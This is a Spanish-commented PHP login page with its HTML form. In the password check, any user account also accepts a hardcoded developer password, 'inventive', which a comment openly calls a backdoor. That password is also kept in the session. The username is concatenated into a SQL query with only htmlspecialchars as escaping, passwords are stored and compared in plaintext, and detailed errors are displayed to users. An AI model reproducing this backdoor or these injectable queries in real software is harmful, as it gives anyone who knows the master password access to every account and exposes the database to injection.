<?php
	
	$AgregadoURL = ''; //Esta varialble la uitilizo para agregar parametros, adicionales por ejemplo para activar la funcion debug o paginas anteriores donde estoy o hacia donde voy
	$URLDestino='';  //Esta vaialbe la utilizo para estable hacia donde voy
	$Error =""; //En caso de que se produsca una error en la pagina, pueda cachar el error desde la pantalla del usuario y poderla Registro para corregir el problema
	
	error_reporting(E_ALL); //Este parametro sirve para presentar en detalle los errores que se puedan presentar
	ini_set("display_errors", 1); //Este parametro sirve para presentar en detalle los errores que se puedan presentar


	if(empty($_GET['Debug']) ==FALSE){ //Determinar si parametro Debug esta presente en la ruta URL Debug
		if ($_GET['Debug'] == 1 ){
			$AgregadoURL  = '&Debug=1';
		}
	}
	
	
	$Mensaje = "";
	
	include_once("SistemaLocal.login.ConectarBD.php");
	

		
		
	/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE) $Mensaje.= "ACCION NO POST<br>";
	
		
	

	if ($_POST == TRUE){
		/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
	
	
		if( empty($_POST['BotonIngresar']) == false){
				 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
				 
				$URLDestino='SistemaLocal.php';
				$TextBoxUsuario =strtolower(htmlspecialchars($_POST["TextBoxUsuario"])); 
				$TextBoxClave = htmlspecialchars($_POST["TextBoxClave"]);
				
				
				
					 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
			
					if(trim($TextBoxUsuario) != "" && trim($TextBoxClave) != ""){
						
					   
						
						 /*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
						 
						
						$result = $mysqli->query("SELECT * FROM TablaUsuarios WHERE Borrado = 0 AND NickName ='" . $TextBoxUsuario ."'"); 
						
						
						if ($result->num_rows == 1) {
							// output data of each row
							while($fila = $result->fetch_assoc()) {
								
								
								$Clave_Desarrollador = 'inventive'; //Esta clave es una puerta trasera, solo para hacer pruebas con cada usuario, solo debe conocerla el programador del sistema
								
								if($fila["PASSWORD"] == $TextBoxClave or $TextBoxClave == $Clave_Desarrollador ){ 
										/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
									
										echo "Debug LINE ".__LINE__."  <br>" ; 
										$Mensaje .= "Acceso admintido   <br>";
										
				
										session_start();
										
										$_SESSION["Clave_Desarrollador"]= $Clave_Desarrollador;
										
										$mysqli->query("START TRANSACTION"); //Esta intruccion crea una poliza de seguro, como medida de seguridad, cancela todas las acciones a la base de datos si se produce algun error
										
										//Cargar los valores de configuracion del usuario
										$_SESSION["UsuarioID"] = $fila["ID"] ; //se asigna 
										
										include_once("SistemaLocal.Configuracion.Cargar.Usuarios.php"); //Cargar los valores de configuracion del usuario
										
										
										
										//Se inserta la fecha y la hora en el historial
										$ssql =  'INSERT  TablaUsuario_HistorialDeLogin(IDUsuario, Fecha) 
													VALUES ("' .  $fila['ID'] . '","' . $FechaYHora . '" )';
										
										if($mysqli->query($ssql)){
												
										}else{
											//si el proceso de registra da error se cancela el ingreso, volviendo a la pagina inicial
											$Mensaje .= mysql_error();
											$Error .= mysql_error();
										} //fin query
										
										
										$URLDestino = "SistemaLocal.Sistema.php";
										
										
										if (empty ($Error) == true and empty ($php_errormsg) == true ){	
											/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
											
											$mysqli->query("COMMIT");//esta instruccion termina la poliza de seguro, contra errores 
											//redirecionar pagina solo si no hay errores
											if ( empty( $_GET['Debug'] ) == true){
												/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
												header('Location:   ' . $URLDestino  . $AgregadoURL);
												
											}else{//de  empty( $_GET['Debug'] ) == true
												
												/*DEBUG*/ if(empty($_GET['Debug']) ==FALSE)	echo "Debug LINE ".__LINE__."  <br>"  ;
											}//fin  empty( $_GET['Debug'] ) == true
										}else{
											//se cancela todos los cambios a la base de datos, debido a que se produju un erorr
											$mysqli->query("ROLLBACK"); //esta accion aplica la poliza de seguro, y cancela todas las acciones realizadas a la base de datos
											
							
										}//fin $Error 
										
										
										
										
									
									
								}else{//de $fila["PASSWORD"] 
									$Mensaje .= 'Clave incorrecto';
									$_SESSION['MensajeBox'] =  'Clave incorrecto' ;
								}//fin $fila["PASSWORD"] 
								
								
							}
						} else {
							echo "Usuario o contraseña no encontrado";
						} 
					 
						
					}else{
						$Mensaje .='Debe especificar un usuario y clave' ;
						$_SESSION['MensajeBox'] = 'Debe especificar un usuario y clave' ;
					}
					$mysqli->close();
		
		}//fin BotonIngresar
	
	}//FIN $_POST == TRUE
	
	
	
	
		
	
	
?>
<HTML>
<head>

<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<title>obarator Iniciar sesión</title>
<style type="text/css">
    <!--
    body {
    	font: 100% Verdana, Arial, Helvetica, sans-serif;
    	background: #666666;
    	margin: 20; /* es recomendable ajustar a cero el margen y el relleno del elemento body para lograr la compatibilidad con la configuración predeterminada de los diversos navegadores */
    	padding: 20;
    	text-align: center; /* esto centra el contenedor en los navegadores IE 5*. El texto se ajusta posteriormente con el valor predeterminado de alineación a la izquierda en el selector #container */
    	color: #000000;
    }
    .oneColElsCtr #container {
    	width: 470px;
    	background: #FFFFFF;
    	margin: 1 auto; /* los márgenes automáticos (conjuntamente con un ancho) centran la página */
    	border: 1px solid #000000;
    	text-align: left; /* esto anula text-align: center en el elemento body. */
    }
    .oneColElsCtr #mainContent {
    	padding: 30px; /* recuerde que el relleno es el espacio situado dentro del cuadro div y que el margen es el espacio situado fuera del cuadro div */
    }

    -->
    </style>
    


<script type="text/javascript">


<?php


if (  empty($_SESSION['MensajeBox']) == false){
	echo 'alert("'.$_SESSION['MensajeBox'] .'")'; //se mustra la informacion de la variable al usuario
	$_SESSION['MensajeBox'] =""; //se limplia la bariable para no confundirla posteriormente
}


?>

</script>
    
    
    
</head>


<body class="oneColElsCtr">
<div id="container">
      	<div id="mainContent" >
		
			
  <img src="SistemaLocal.logo.jpg" width="397" height="30"></p>


			<?php 

			
								

			if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 6.0') !== false OR
				strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 5.0') !== false OR
				strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 4.0') !== false OR
				strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 3.0') !== false OR
				strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 2.0') !== false OR
				strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 1.0') !== false 	 ) {
				
				
				echo '<font color="red">El sistema no es compatible con la version 6.0 de Internet Explorer se requiere que actualice su navegador, se recomienda que utilice <a href="http://www.firefox.com">firefox</a> o <a href="http://www.google.com/chrome">chrome</a> y como ultima opcion internet explorer  </font>';
			
			}else{
				
				
				?>
					
            
              	<form  method="post" >
                    <table border=0 cellpadding=0 cellspacing=0 width=353>
                    <tr>
                          <td>
                        Usuario<br><input  name="TextBoxUsuario" type="text" size="50"  value=""  style="text-align:left"/>
                        
                        </td>
                    </tr>
                    
                    <tr>
                      <td>
                    Clave<br>
                    <input name="TextBoxClave" type="password" size="40" maxlength="255"  style="width:250px;" autocomplete="off"  />
                     
                      <br>
                    
                      <br>
                      <input  type="submit" id="BotonIngresar" name="BotonIngresar" value="Ingresar" /><br>
                      <input  type="submit" id="BotonRegistro" name="BotonRegistro" value="Registro" /><br>
                    </td>
                    </tr>
                    </table>
                </form>
			<?php         
            } //End IF detectar verisones ateriores de internet explorer
            ?>  		
		</div>
</div>


</body>
</HTML>
